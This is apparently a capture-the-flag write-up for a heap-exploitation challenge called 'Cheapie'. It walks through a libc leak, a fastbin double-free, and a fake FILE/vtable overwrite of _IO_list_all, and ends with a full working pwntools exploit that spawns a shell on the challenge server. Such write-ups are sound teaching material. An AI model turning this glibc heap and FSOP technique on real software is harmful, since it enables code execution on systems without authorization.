# Cheapie (pwn - 198 pts)

> Êtes-vous familier avec le tas ?

Yay a heap challenge !

## Setup
The given `libc` didn't have any symbols and no loader was provided, so I ran [pwninit](https://github.com/io12/pwninit) to retrieve a libc with symbols and a loader. Which I didn't realise until me writing this, is that `pwninit` gave me a different libc, that changed the final part of the exploit : getting a shell !

## Testing the water
Here is the `checksec` output for the binary :
```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

And here is an overview of the program :
```bash
$ ./cheapie
Malloc exploitation playground!
  [1] - malloc()
  [2] - free()
  [3] - debug()
  [4] - exit()
>>> 1
Amount in bytes [16-1024]: 1024
malloc(1024) = 0x55b575c462a0
Data to write (up to 1024 bytes):
On dit LA heap
  [1] - malloc()
  [2] - free()
  [3] - debug()
  [4] - exit()
>>> 2
Address to free: 0x55b575c462a0
free(0x55b575c462a0)
  [1] - malloc()
  [2] - free()
  [3] - debug()
  [4] - exit()
>>> 3
Address to show (16-byte sneak peak): 0x55b575c462a0
00 00 00 00 00 00 00 00 10 60 c4 75 b5 55 00 00
  [1] - malloc()
  [2] - free()
  [3] - debug()
  [4] - exit()
>>> 4
```
We have a lot to work with here. We have an arbitrary arbitrary read including a read-after-free and an arbitrary free including a double-free... this is far from enough to pwn the binary ! We don't have to care about the ASLR regarding the heap since the program prints us the return value of `malloc`.

## Exploiting
I started with the usual heap-exploit methodology : using the double-free to gain a write-what-where primitive in order to write the address of a "one gadget" (a gadget that instantly pops a shell), in the `__malloc_hook` or in `__free_hook`. Since these are located in the libc, we've got to be...

### ... Leaking the libc
Using the read-after-free, we can quickly leak the address of the libc by linking a chunk inside the unsorted bin and reading it. We can do so with :
```python
#!/usr/bin/python3

from pwn import *

exe = ELF("./cheapie")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

gs = """
continue
"""

def start():
    if not args.REMOTE:
        p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        gdb.attach(p, "continue\n")
    else:
        p = remote("challenges2.france-cybersecurity-challenge.fr", 4006)
    return p

def malloc(n, data) -> int:
    """
    mallocs `n` bytes, write `data` to the allocated chunk and the address of the user data
    """
    io.sendline("1")
    io.sendlineafter("Amount in bytes [16-1024]: ", f"{n}")
    io.recvuntil(f"malloc({n}) = ")
    chunk_addr = int(io.recvline().strip()[2:], 16)
    io.recvline()
    io.send(data)
    io.recvuntil(">>> ")
    return chunk_addr

def free(addr: int):
    """
    frees `addr`
    """
    io.sendline("2")
    io.sendlineafter("Address to free: ", hex(addr))
    io.recvuntil(">>> ")

def read(addr: int) -> bytearray:
    """
    reads `addr` and returns the content in the form of a bytearray
    """
    addr = hex(addr)
    io.sendline("3")
    io.sendlineafter("Address to show (16-byte sneak peak): ", addr)
    data = io.recvline()
    data = data.strip()
    data = data.replace(b" ", b"")
    io.recvuntil(">>> ")
    return bytearray.fromhex(data.decode("utf8"))

def exit():
    """
    launches a DDOS attack on the infrastructure
    """
    io.sendline("4")

io = start()

chunk_A = malloc(0x100, "A"*0x100)
chunk_B = malloc(0x100, "B"*0x100)

free(chunk_A)
print(read(chunk_A))
```

When we run it, the script prints `bytearray(b'x\xab\x7fc\x97\x7f\x00\x00x\xab\x7fc\x97\x7f\x00\x00')`, which the address `0x7f97637fab78`, two times. As we can see by issuing `x 0x7f97637fab78` in `gdb`, it outputs `0x7f97637fab78 <main_arena+88>:	0x0000555556907220`; it corresponds to the address of the `main_arena`, located in the libc, plus 88 bytes.
Here's how it works...
Using `gef`s `heap chunks` and `heap bins` commands, we can display the state of the heap :
```bash
gef➤  heap chunks
Chunk(addr=0x555556907010, size=0x110, flags=PREV_INUSE)
    [0x0000555556907010     78 ab 7f 63 97 7f 00 00 78 ab 7f 63 97 7f 00 00    x..c....x..c....]
Chunk(addr=0x555556907120, size=0x110, flags=)
    [0x0000555556907120     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]
Chunk(addr=0x555556907230, size=0x20de0, flags=PREV_INUSE)  ←  top chunk

gef➤  heap bins
[+] unsorted_bins[0]: fw=0x555556907000, bk=0x555556907000
 →   Chunk(addr=0x555556907010, size=0x110, flags=PREV_INUSE)
```
We can see that the chunk `A` was linked inside the unsorted bin, meaning that the `main arena` has two pointers (a `fd`, forward pointer, and a `bk`, backward pointer) pointing to the chunk `A`, itself having two pointers pointing inside the `main arena`; that is where our address `0x7f97637fab78` is coming from.
You might wonder why we had to allocate a 2nd chunk instead of just allocating `chunk_A`. That's because of something called "consolidation" : chunks of this size (0x110) are automatically "fused", consolidated, with the `top chunk` when freed, instead of being linked to the `unsorted bin`. The chunk `B` acts as a "guard" to prevent consolidation. Mind that any size for the chunk `B` would do.

We can then rebase our libc using `pwntools` by changing a few lines :
```python
io = start()

chunk_A = malloc(0x100, "AAAA")
chunk_B = malloc(0x100, "BBBB")

# Free chunk A
free(chunk_A)

# Read fd from chunk A
chunk_A_data = read(chunk_A)
main_arena_leak = u64(chunk_A_data[:8])
libc.address = (main_arena_leak - 88) - libc.sym.main_arena
log.info(f"libc : {libc.address:#x}")

# Free chunk B
free(chunk_B)
```

What we want to do next is conduct what is called a "fastbin dup" attack using the double-free vulnerability in order to write the address of a one gadget (a gadget that instantly pop a shell) in the `__free_hook`. We can then call `free` whenever we want, through the option `2`. Here is how we're going to do it :
- Allocated two `0x70`-sized chunks, `C` and `D`. Because they are small, they will go in something called a `fastbin`
- Free `C`, then `D`, then free `C` again. Now the `fastbin` for chunks of size `0x70` contains the `C` chunk, that a `fd` pointing to the `D` chunk, pointing to the `C` chunk again. Allocating three times then will result in gaining control of the `C` chunk, two times, and over the `D` chunk one time. We can't free the `C` chunk two times straight away because malloc (it's the name of the allocator) is checking wether [we're freeing the same chunk](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4275) consecutively
- Allocate another `0x70`-sized chunk, gaining control of the `C` chunk, to write the address of the `__free_hook` (or more like an address right before the `__free_hook` so that `__free_hook` is located in the user data) in it. The fastbin will be looking like this : `D -> C -> __free_hook`.
- Allocate two times again, thus gaining control over `D`, then `C` again, but we don't care about them anymore
- Make the final allocation to gain control over the  `__free_hook` chunk and write the address of a one gadget inside the `__free_hook`
- Trigger the `__free_hook` by calling `free` and flag !

But... it didn't got that well. In order to find one gadgets, I use [this tool](https://github.com/david942j/one_gadget), which is great ! but all the one gagets it gave me ...
```bash
$ one_gadget ./libc-2.23.so
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
... weren't viable. None of the constraints were satisfied. After flagging the challenge, without using a one gadget (you'll see how), I found out that the original libc (not the one given by `pwninit`) actually had viable one gadgets. "So how did you do ?", you may ask. Well, I made a ...

### File stream orientated programming (FSOP)
FSOPs can be very useful, for example when you do not have any viable one gadget. The one used is also kind of pretty since we gain a shell by calling just `exit`ing.
In the libc exists a type, `struct _IO_FILE`, or `FILE`, for short that is used to describe file streams. Using the `dt FILE`, "dump type", command in [pwndbg](https://github.com/pwndbg/pwndbg), we can print the `FILE` type :
```c
FILE
    +0x0000 _flags               : int
    +0x0008 _IO_read_ptr         : char *
    +0x0010 _IO_read_end         : char *
    +0x0018 _IO_read_base        : char *
    +0x0020 _IO_write_base       : char *
    +0x0028 _IO_write_ptr        : char *
    +0x0030 _IO_write_end        : char *
    +0x0038 _IO_buf_base         : char *
    +0x0040 _IO_buf_end          : char *
    +0x0048 _IO_save_base        : char *
    +0x0050 _IO_backup_base      : char *
    +0x0058 _IO_save_end         : char *
    +0x0060 _markers             : struct _IO_marker *
    +0x0068 _chain               : struct _IO_FILE *
    +0x0070 _fileno              : int
    +0x0074 _flags2              : int
    +0x0078 _old_offset          : __off_t
    +0x0080 _cur_column          : short unsigned int
    +0x0082 _vtable_offset       : signed char
    +0x0083 _shortbuf            : char [1]
    +0x0088 _lock                : _IO_lock_t *
    +0x0090 _offset              : __off64_t
    +0x0098 _codecvt             : struct _IO_codecvt *
    +0x00a0 _wide_data           : struct _IO_wide_data *
    +0x00a8 _freeres_list        : struct _IO_FILE *
    +0x00b0 _freeres_buf         : void *
    +0x00b8 __pad5               : size_t
    +0x00c0 _mode                : int
    +0x00c4 _unused2             : char [20]
```

I know that's a lot but we don't care about most of the fields.
Mind the `_chain` field inside the structure. Like in the fastbins for the heap chunks under `0x80` bytes, all the `FILE` streams in the libc are singly-linked (using the `_chain` field). The first member of this list is the `_IO_list_all` symbol that contains the last opened `FILE` stream, `stderr` in this case (but we don't really care), and a pointer to a vtable (yup, C++ has corrupted the libC). When a file stream needs to be cleaned, for example when closed (when the program exits _for example_), the `overflow` function in this vtable is called, with a pointer to the `FILE` structure that needs to be closed as first parameter. This `overflow` function is only called if `_mode <= 0 && _IO_write_ptr > _IO_write_base`. Hohoho, I wonder if we can control this vtable to make the `overflow` field to point to the `system` function...

What we're going to do is overwrite the `_IO_list_all` to make it point to some memory we control on the heap. We can craft a fake `FILE` structure adjacent to a fake `vtable` pointer, which contains a pointer to `system` instead of the usual pointer to `overflow`.

First, craft the fake vtable :
```python
# Create fake vtable
fake_vtable = p64(0) * 3
fake_vtable += p64(libc.sym.system)
vtable_addr = malloc(0x100, fake_vtable)
```
Mind that the `overflow` function is the 4th member of the vtable.
Then craft the fake `FILE` structure which is followed by the fake vtable pointer :
```python
# Create fake FILE
fake_file = b"/bin/sh\0"                # _flags
fake_file += p64(0x61)                  # _IO_read_ptr
fake_file += p64(0xdeadbeef)            # _IO_read_end
fake_file += p64(0xdeadbeef)            # _IO_read_base
fake_file += p64(1)                     # _IO_write_base
fake_file += p64(2)                     # _IO_write_ptr
fake_file += p64(0)*18                  # _IO_write_end ... __pad5
fake_file += p32(0)                     # _mode
fake_file += p8(0)*20                   # _unused2
fake_file += p64(vtable_addr)
file_addr = malloc(0x100, fake_file)
```

Everything is ready, we just need to leverage the write-what-where primitive that we gained through the fastbin dup in order to write the `_IO_list_all` :
```python
chunk_C = malloc(0x68, "CCCC")
chunk_D = malloc(0x68, "DDDD")
free(chunk_C)
free(chunk_D)
free(chunk_C)

malloc(0x68, p64(libc.sym._IO_list_all - 35))
malloc(0x68, "yay")
malloc(0x68, "yay")
malloc(0x68, p8(0)*(35-16) + p64(file_addr))
```

And finally, **\*fireworks\***... called `exit` :
```python
exit()
io.interactive()
```

Run the script with the `REMOTE` argument (see the `start` function) to target the remote server and listen carefully for the shell *pop*ping
![](@attachment/Clipboard_2021-05-03-09-37-15.png)

Yay !

## Conclusion
Don't boycott `pwninit`, but don't blindly use it.


## Final exploit
```python
#!/usr/bin/python3

from pwn import *

exe = ELF("./cheapie")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

gs = """
continue
"""

def start():
    if not args.REMOTE:
        p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        gdb.attach(p, "continue\n")
    else:
        p = remote("challenges2.france-cybersecurity-challenge.fr", 4006)
    return p

def malloc(n, data):
    io.sendline("1")
    io.sendlineafter("Amount in bytes [16-1024]: ", f"{n}")
    io.recvuntil(f"malloc({n}) = ")
    chunk_addr = int(io.recvline().strip()[2:], 16)
    io.recvline()
    io.send(data)
    io.recvuntil(">>> ")
    return chunk_addr

def free(addr: int):
    io.sendline("2")
    io.sendlineafter("Address to free: ", hex(addr))
    io.recvuntil(">>> ")

def read(addr: int):
    addr = hex(addr)
    io.sendline("3")
    io.sendlineafter("Address to show (16-byte sneak peak): ", addr)
    data = io.recvline()
    data = data.strip()
    data = data.replace(b" ", b"")
    io.recvuntil(">>> ")
    return bytearray.fromhex(data.decode("utf8"))

def exit():
    io.sendline("4")

io = start()

chunk_A = malloc(0x100, "AAAA")
chunk_B = malloc(0x100, "BBBB")

# Free chunk A
free(chunk_A)

# Read fd from chunk A
chunk_A_data = read(chunk_A)
main_arena_leak = u64(chunk_A_data[:8])
libc.address = (main_arena_leak - 88) - libc.sym.main_arena
log.info(f"libc : {libc.address:#x}")

# Free chunk B
free(chunk_B)

"""
FILE
    +0x0000 _flags               : int
    +0x0008 _IO_read_ptr         : char *
    +0x0010 _IO_read_end         : char *
    +0x0018 _IO_read_base        : char *
    +0x0020 _IO_write_base       : char *
    +0x0028 _IO_write_ptr        : char *
    +0x0030 _IO_write_end        : char *
    +0x0038 _IO_buf_base         : char *
    +0x0040 _IO_buf_end          : char *
    +0x0048 _IO_save_base        : char *
    +0x0050 _IO_backup_base      : char *
    +0x0058 _IO_save_end         : char *
    +0x0060 _markers             : struct _IO_marker *
    +0x0068 _chain               : struct _IO_FILE *
    +0x0070 _fileno              : int
    +0x0074 _flags2              : int
    +0x0078 _old_offset          : __off_t
    +0x0080 _cur_column          : short unsigned int
    +0x0082 _vtable_offset       : signed char
    +0x0083 _shortbuf            : char [1]
    +0x0088 _lock                : _IO_lock_t *
    +0x0090 _offset              : __off64_t
    +0x0098 _codecvt             : struct _IO_codecvt *
    +0x00a0 _wide_data           : struct _IO_wide_data *
    +0x00a8 _freeres_list        : struct _IO_FILE *
    +0x00b0 _freeres_buf         : void *
    +0x00b8 __pad5               : size_t
    +0x00c0 _mode                : int
    +0x00c4 _unused2             : char [20]
"""
# Create fake vtable
fake_vtable = p64(0) * 3
fake_vtable += p64(libc.sym.system)
vtable_addr = malloc(0x100, fake_vtable)

# Create fake FILE
fake_file = b"/bin/sh\0"                # _flags
fake_file += p64(0x61)                  # _IO_read_ptr
fake_file += p64(0xdeadbeef)            # _IO_read_end
fake_file += p64(0xdeadbeef)            # _IO_read_base
fake_file += p64(1)                     # _IO_write_base
fake_file += p64(2)                     # _IO_write_ptr
fake_file += p64(0)*18                  # _IO_write_end ... __pad5
fake_file += p32(0)                     # _mode
fake_file += p8(0)*20                   # _unused2
fake_file += p64(vtable_addr)
file_addr = malloc(0x100, fake_file)


chunk_C = malloc(0x68, "CCCC")
chunk_D = malloc(0x68, "DDDD")
free(chunk_C)
free(chunk_D)
free(chunk_C)

malloc(0x68, p64(libc.sym._IO_list_all - 35))
malloc(0x68, "osef")
malloc(0x68, "osef")
malloc(0x68, p8(0)*(35-16) + p64(file_addr))
exit()

io.interactive()
```
